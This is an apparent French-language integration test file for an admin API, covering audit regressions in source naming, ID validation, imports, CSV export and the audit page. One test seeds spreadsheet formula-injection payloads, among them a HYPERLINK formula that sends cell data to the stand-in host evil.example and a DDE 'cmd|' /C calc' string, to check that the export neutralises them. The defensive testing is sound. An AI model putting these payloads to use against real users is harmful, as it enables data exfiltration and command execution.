/**
 * Intégration — régressions de l'audit « API d'administration » (lot B).
 *
 *   #1        sources : nom déjà pris → 409 name_taken (et non 500)
 *   #2/14/50  export CSV : neutralisation des formules tableur (CWE-1236)
 *   #25       export CSV : journal d'audit écrit AVANT le premier octet
 *   #26       export CSV : filtres d'URL validés avant d'ouvrir le flux (422)
 *   #27       users/[id] : identifiant non uuid → 400 invalid_id (et non 500)
 *   #28       route-did : utilisateur inconnu → 404, rien touché
 *   #29/59    import : valeurs par défaut inexistantes → 422 invalid_default
 *   #49       page /admin/audit : filtres d'URL invalides ignorés (pas de 500)
 *   #66       suppression d'un compte : ses commentaires bloquent aussi
 *
 * Même montage que tests/int-admin.test.ts : vrais JWT `jose` dans le cookie
 * `nexus_session`, vraie base Postgres locale, réseau voip.ms simulé.
 */
import { afterAll, afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { eq } from "drizzle-orm";
import { SignJWT } from "jose";
import {
  closeDb,
  makeClient,
  makeSource,
  makeUser,
  resetDb,
  seedSystemCategories,
  testDb,
} from "./helpers/db";
import { auditLogs, clients, comments, sources, users } from "@/db/schema";

// ── Stubs d'environnement Next ───────────────────────────────────────────────
const jar = vi.hoisted(() => new Map<string, string>());

vi.mock("server-only", () => ({}));
vi.mock("next/cache", () => ({ revalidatePath: vi.fn(), revalidateTag: vi.fn() }));
vi.mock("next/headers", () => ({
  cookies: async () => ({
    get: (name: string) => (jar.has(name) ? { name, value: jar.get(name)! } : undefined),
    set: (name: string, value: string) => {
      jar.set(name, value);
    },
    delete: (name: string) => {
      jar.delete(name);
    },
  }),
  headers: async () => new Headers({ "x-forwarded-for": "24.48.1.1" }),
}));
// La page d'audit est un Server Component : on lui fournit un vrai traducteur
// (messages fr du namespace admin) hors contexte de requête Next.
vi.mock("next-intl/server", async () => {
  const { createTranslator } = await import("next-intl");
  const admin = (await import("../messages/fr/admin.json")).default;
  return {
    getTranslations: async (namespace: string) =>
      createTranslator({ locale: "fr", messages: { [namespace]: admin }, namespace }),
    getLocale: async () => "fr",
  };
});

const sourcesRoute = await import("@/app/api/admin/sources/route");
const sourceIdRoute = await import("@/app/api/admin/sources/[id]/route");
const userIdRoute = await import("@/app/api/admin/users/[id]/route");
const resetPasswordRoute = await import("@/app/api/admin/users/[id]/reset-password/route");
const routeDidRoute = await import("@/app/api/admin/voipms/route-did/route");
const importRoute = await import("@/app/api/admin/import/route");
const exportRoute = await import("@/app/api/admin/export/route");
const auditPage = await import("@/app/(app)/admin/audit/page");
const { flushAfterResponse } = await import("@/lib/after-response");

// ── Session ──────────────────────────────────────────────────────────────────

const SECRET = new TextEncoder().encode(process.env.AUTH_SECRET!);

async function signSession(uid: string, role: "admin" | "caller", tv: number) {
  return new SignJWT({ uid, role, tv, remember: true })
    .setProtectedHeader({ alg: "HS256" })
    .setIssuedAt()
    .setExpirationTime("1h")
    .sign(SECRET);
}

async function loginAs(user: { id: string; role: "admin" | "caller"; tokenVersion: number }) {
  jar.set("nexus_session", await signSession(user.id, user.role, user.tokenVersion));
}

function logout() {
  jar.delete("nexus_session");
}

function jsonRequest(url: string, method: string, body?: unknown) {
  return new Request(url, {
    method,
    headers: { "content-type": "application/json" },
    ...(body === undefined ? {} : { body: JSON.stringify(body) }),
  });
}

const ctx = (id: string) => ({ params: Promise.resolve({ id }) });

/** Un uuid bien formé qui ne désigne rien. */
const GHOST = "00000000-0000-4000-8000-000000000000";

async function exportRows(query = ""): Promise<string[]> {
  const res = await exportRoute.GET(new Request(`http://localhost/api/admin/export${query}`));
  expect(res.status).toBe(200);
  const text = Buffer.from(await res.arrayBuffer()).subarray(3).toString("utf8");
  return text.split("\r\n").filter(Boolean);
}

describe("corrections — API d'administration (lot B)", () => {
  beforeEach(async () => {
    await resetDb();
    logout();
  });
  afterEach(async () => {
    // Vider le travail différé (bilan d'export) TANT QUE les comptes existent :
    // après le resetDb du test suivant, il échouerait en violation de FK.
    await flushAfterResponse();
    vi.unstubAllGlobals();
  });
  afterAll(closeDb);

  // ══ #1 — sources : nom déjà pris ══════════════════════════════════════════

  describe("sources : unicité du nom", () => {
    it("RÉGRESSION : créer deux fois le même nom répond 409 name_taken (Drizzle enveloppe l'erreur PG)", async () => {
      const admin = await makeUser({ role: "admin" });
      await loginAs(admin);

      const first = await sourcesRoute.POST(
        jsonRequest("http://localhost/api/admin/sources", "POST", { name: "Facebook", color: "#112233" }),
      );
      expect(first.status).toBe(200);

      const second = await sourcesRoute.POST(
        jsonRequest("http://localhost/api/admin/sources", "POST", { name: "Facebook", color: "#445566" }),
      );
      expect(second.status).toBe(409);
      await expect(second.json()).resolves.toEqual({ error: "name_taken" });
      expect(await testDb.select().from(sources)).toHaveLength(1);
    });

    it("RÉGRESSION : renommer vers un nom existant répond 409 name_taken", async () => {
      const admin = await makeUser({ role: "admin" });
      await makeSource({ name: "Facebook" });
      const mine = await makeSource({ name: "Site web" });
      await loginAs(admin);

      const res = await sourceIdRoute.PATCH(
        jsonRequest(`http://localhost/api/admin/sources/${mine.id}`, "PATCH", { name: "Facebook" }),
        ctx(String(mine.id)),
      );
      expect(res.status).toBe(409);
      await expect(res.json()).resolves.toEqual({ error: "name_taken" });

      const [kept] = await testDb.select().from(sources).where(eq(sources.id, mine.id));
      expect(kept.name).toBe("Site web");
    });
  });

  // ══ #27 — users/[id] : identifiant mal formé ══════════════════════════════

  describe("users/[id] : identifiant non uuid", () => {
    it("PATCH, DELETE et reset-password répondent 400 invalid_id au lieu de lever", async () => {
      const admin = await makeUser({ role: "admin" });
      await loginAs(admin);

      const patch = await userIdRoute.PATCH(
        jsonRequest("http://localhost/api/admin/users/not-a-uuid", "PATCH", { name: "x" }),
        ctx("not-a-uuid"),
      );
      expect(patch.status).toBe(400);
      await expect(patch.json()).resolves.toEqual({ error: "invalid_id" });

      const del = await userIdRoute.DELETE(
        new Request("http://localhost/api/admin/users/123", { method: "DELETE" }),
        ctx("123"),
      );
      expect(del.status).toBe(400);
      await expect(del.json()).resolves.toEqual({ error: "invalid_id" });

      const reset = await resetPasswordRoute.POST(
        new Request("http://localhost/api/admin/users/123/reset-password", { method: "POST" }),
        ctx("123"),
      );
      expect(reset.status).toBe(400);
      await expect(reset.json()).resolves.toEqual({ error: "invalid_id" });
    });

    it("un uuid bien formé mais inconnu reste un 404 not_found", async () => {
      const admin = await makeUser({ role: "admin" });
      await loginAs(admin);

      const res = await userIdRoute.PATCH(
        jsonRequest(`http://localhost/api/admin/users/${GHOST}`, "PATCH", { name: "x" }),
        ctx(GHOST),
      );
      expect(res.status).toBe(404);
    });
  });

  // ══ #66 — suppression : les commentaires comptent comme historique ════════

  describe("DELETE /api/admin/users/[id] : commentaires", () => {
    it("refuse (409 has_activity) un compte dont la seule activité est d'avoir commenté des fiches", async () => {
      const admin = await makeUser({ role: "admin" });
      const target = await makeUser({ name: "Annotateur" });
      const client = await makeClient();
      await testDb.insert(comments).values({
        clientId: client.id,
        userId: target.id,
        body: "Rappeler après 18 h — @[Alex](x)",
      });
      await loginAs(admin);

      const res = await userIdRoute.DELETE(
        new Request(`http://localhost/api/admin/users/${target.id}`, { method: "DELETE" }),
        ctx(target.id),
      );
      expect(res.status).toBe(409);
      await expect(res.json()).resolves.toEqual({ error: "has_activity" });

      // Le compte ET le commentaire (historique du dossier) sont intacts.
      expect(await testDb.select().from(users).where(eq(users.id, target.id))).toHaveLength(1);
      expect(await testDb.select().from(comments)).toHaveLength(1);
    });
  });

  // ══ #28 — route-did : utilisateur inconnu ═════════════════════════════════

  describe("POST /api/admin/voipms/route-did", () => {
    it("refuse (404 user_not_found) un userId inconnu AVANT de toucher voip.ms ou au détenteur actuel", async () => {
      const admin = await makeUser({ role: "admin" });
      const holder = await makeUser({ name: "Alex", didNumber: "+14184761542" });
      await loginAs(admin);
      const fetchMock = vi.fn(async () => new Response("{}", { status: 200 }));
      vi.stubGlobal("fetch", fetchMock);

      const res = await routeDidRoute.POST(
        jsonRequest("http://localhost/api/admin/voipms/route-did", "POST", {
          did: "4184761542",
          account: "551013_alex",
          userId: GHOST,
        }),
      );
      expect(res.status).toBe(404);
      await expect(res.json()).resolves.toEqual({ error: "user_not_found" });

      // Rien n'est parti chez voip.ms, et le détenteur garde son numéro.
      expect(fetchMock).not.toHaveBeenCalled();
      const [after] = await testDb.select().from(users).where(eq(users.id, holder.id));
      expect(after.didNumber).toBe("+14184761542");
      expect(await testDb.select().from(auditLogs)).toHaveLength(0);
    });
  });

  // ══ #29 / #59 — import : valeurs par défaut inexistantes ══════════════════

  describe("POST /api/admin/import : valeurs par défaut", () => {
    const importUrl = "http://localhost/api/admin/import";

    it("refuse (422 invalid_default) une catégorie, une source ou un assigné qui n'existe plus — rien n'est écrit", async () => {
      await seedSystemCategories();
      const admin = await makeUser({ role: "admin" });
      await loginAs(admin);

      for (const [defaults, field] of [
        [{ categoryId: 999999 }, "categoryId"],
        [{ sourceId: 424242 }, "sourceId"],
        [{ assignedToId: GHOST }, "assignedToId"],
      ] as const) {
        const res = await importRoute.POST(
          jsonRequest(importUrl, "POST", {
            rows: [{ fullName: "Alice Roy", phone: "418-476-1542" }],
            defaults,
            mode: "skip",
          }),
        );
        expect(res.status).toBe(422);
        await expect(res.json()).resolves.toEqual({ error: "invalid_default", field });
      }
      expect(await testDb.select().from(clients)).toHaveLength(0);
      expect(await testDb.select().from(auditLogs)).toHaveLength(0);
    });

    it("mode « update » : un assigné inexistant est refusé avant la moindre mise à jour", async () => {
      await seedSystemCategories();
      const admin = await makeUser({ role: "admin" });
      const existing = await makeClient({ fullName: "Ancien nom", phone: "+14184761542" });
      await loginAs(admin);

      const res = await importRoute.POST(
        jsonRequest(importUrl, "POST", {
          rows: [
            { fullName: "Nouveau nom", phone: "418-476-1542" },
            { fullName: "Nouvelle fiche", phone: "514-555-0142" },
          ],
          defaults: { assignedToId: GHOST },
          mode: "update",
        }),
      );
      expect(res.status).toBe(422);
      await expect(res.json()).resolves.toEqual({ error: "invalid_default", field: "assignedToId" });

      const [kept] = await testDb.select().from(clients).where(eq(clients.id, existing.id));
      expect(kept.fullName).toBe("Ancien nom");
      expect(await testDb.select().from(clients)).toHaveLength(1);
    });

    it("avec des valeurs par défaut valides, l'import passe et les applique", async () => {
      await seedSystemCategories();
      const admin = await makeUser({ role: "admin" });
      const source = await makeSource({ name: "Notion" });
      const caller = await makeUser({ name: "Sam" });
      await loginAs(admin);

      const res = await importRoute.POST(
        jsonRequest(importUrl, "POST", {
          rows: [{ fullName: "Alice Roy", phone: "418-476-1542" }],
          defaults: { sourceId: source.id, assignedToId: caller.id },
          mode: "skip",
        }),
      );
      expect(res.status).toBe(200);
      await expect(res.json()).resolves.toMatchObject({ created: 1 });
      const [row] = await testDb.select().from(clients);
      expect(row.sourceId).toBe(source.id);
      expect(row.assignedToId).toBe(caller.id);
    });
  });

  // ══ #26 — export : filtres validés avant le flux ══════════════════════════

  describe("GET /api/admin/export : filtres", () => {
    it.each([
      "?categoryId=abc",
      "?sourceId=1.5",
      "?assignedToId=me",
      "?from=hier",
      "?from=2026-02-30",
      "?to=2026-13-01",
    ])("répond 422 validation (pas un 200 tronqué) pour %s", async (query) => {
      const admin = await makeUser({ role: "admin" });
      await loginAs(admin);

      const res = await exportRoute.GET(new Request(`http://localhost/api/admin/export${query}`));
      expect(res.status).toBe(422);
      expect(res.headers.get("content-type")).toContain("application/json");
      await expect(res.json()).resolves.toMatchObject({ error: "validation" });
      // Aucun export n'a commencé : rien au journal.
      expect(await testDb.select().from(auditLogs)).toHaveLength(0);
    });

    it("un paramètre vide vaut « pas de filtre » et les filtres valides s'appliquent", async () => {
      const cats = await seedSystemCategories();
      const admin = await makeUser({ role: "admin" });
      const sam = await makeUser({ name: "Sam" });
      await loginAs(admin);
      await makeClient({ fullName: "Gardé", phone: "+14184761542", assignedToId: sam.id, categoryId: cats.new.id });
      await makeClient({ fullName: "Exclu", phone: "+15145550142", categoryId: cats.new.id });

      const all = await exportRows("?from=&to=&categoryId=");
      expect(all).toHaveLength(3);

      const filtered = await exportRows(`?assignedToId=${sam.id}&categoryId=${cats.new.id}&from=2000-01-01`);
      expect(filtered).toHaveLength(2);
      expect(filtered[1]).toContain("Gardé");
    });
  });

  // ══ #2 / #14 / #50 — export : injection de formule ════════════════════════

  describe("GET /api/admin/export : formules tableur", () => {
    it("neutralise les cellules qui commencent par = @ + - TAB, mais laisse les nombres signés (E.164) intacts", async () => {
      await seedSystemCategories();
      const admin = await makeUser({ role: "admin" });
      await loginAs(admin);
      await makeClient({
        fullName: '=HYPERLINK("https://evil.example/?"&C2,"Ouvrir")',
        phone: "+14184761542",
        notes: "@SUM(1+1)",
        city: "-2+3+cmd|' /C calc'!A0",
        address: "\tTab en tête",
        budget: "-3",
        projectType: "+1e5",
      });

      const [, row] = await exportRows();
      // Formule : apostrophe en tête, cellule forcée entre guillemets (guillemets doublés).
      expect(row).toContain('"\'=HYPERLINK(""https://evil.example/?""&C2,""Ouvrir"")"');
      expect(row).toContain("\"'@SUM(1+1)\"");
      expect(row).toContain("\"'-2+3+cmd|' /C calc'!A0\"");
      expect(row).toContain("\"'\tTab en tête\"");
      expect(row).toContain("\"'+1e5\"");
      // Nombres signés purs : lisibles et réimportables tels quels.
      expect(row).toContain(",+14184761542,");
      expect(row).toContain(",-3,");
      expect(row).not.toContain("'+14184761542");
    });
  });

  // ══ #25 — export : audit avant le premier octet ═══════════════════════════

  describe("GET /api/admin/export : journal d'audit", () => {
    it("journalise l'export (avec ses filtres) AVANT de livrer la moindre ligne, puis le bilan une fois le flux terminé", async () => {
      const cats = await seedSystemCategories();
      const admin = await makeUser({ role: "admin" });
      await loginAs(admin);
      await makeClient({ fullName: "Marie", phone: "+14184761542", categoryId: cats.new.id });

      const res = await exportRoute.GET(
        new Request(`http://localhost/api/admin/export?categoryId=${cats.new.id}`),
      );
      expect(res.status).toBe(200);

      // Le corps n'a pas encore été lu : la trace existe déjà.
      const started = await testDb.select().from(auditLogs).where(eq(auditLogs.action, "export.csv"));
      expect(started).toHaveLength(1);
      expect(started[0].userId).toBe(admin.id);
      expect(started[0].detail).toMatchObject({ filters: { categoryId: cats.new.id } });

      await res.text();
      await flushAfterResponse();

      const done = await testDb
        .select()
        .from(auditLogs)
        .where(eq(auditLogs.action, "export.csv"))
        .orderBy(auditLogs.createdAt);
      expect(done).toHaveLength(2);
      expect(done[1].detail).toMatchObject({ count: 1, partial: false, filters: { categoryId: cats.new.id } });
    });

    it("un téléchargement interrompu est consigné comme partiel", async () => {
      const admin = await makeUser({ role: "admin" });
      await loginAs(admin);
      await makeClient({ fullName: "Marie", phone: "+14184761542" });

      const res = await exportRoute.GET(new Request("http://localhost/api/admin/export"));
      expect(res.status).toBe(200);
      // Le navigateur coupe après l'en-tête : le flux refuse ensuite d'écrire.
      const reader = res.body!.getReader();
      await reader.read();
      await reader.cancel();
      await flushAfterResponse();

      const rows = await testDb
        .select()
        .from(auditLogs)
        .where(eq(auditLogs.action, "export.csv"))
        .orderBy(auditLogs.createdAt);
      expect(rows).toHaveLength(2);
      expect(rows[1].detail).toMatchObject({ partial: true });
    });
  });

  // ══ #49 — page /admin/audit : filtres invalides ═══════════════════════════

  describe("page /admin/audit", () => {
    it("RÉGRESSION : un userId non uuid ou une date impossible sont ignorés au lieu de faire tomber la page", async () => {
      const admin = await makeUser({ role: "admin" });
      await loginAs(admin);
      await testDb.insert(auditLogs).values({ userId: admin.id, action: "login.success", entity: "user" });

      await expect(
        auditPage.default({
          searchParams: Promise.resolve({ userId: "abc", from: "2026-02-30", to: "hier" }),
        }),
      ).resolves.toBeTruthy();
    });

    it("des filtres valides continuent de s'appliquer", async () => {
      const admin = await makeUser({ role: "admin" });
      await loginAs(admin);

      await expect(
        auditPage.default({
          searchParams: Promise.resolve({ userId: admin.id, from: "2026-01-01", to: "2026-12-31" }),
        }),
      ).resolves.toBeTruthy();
    });
  });
});
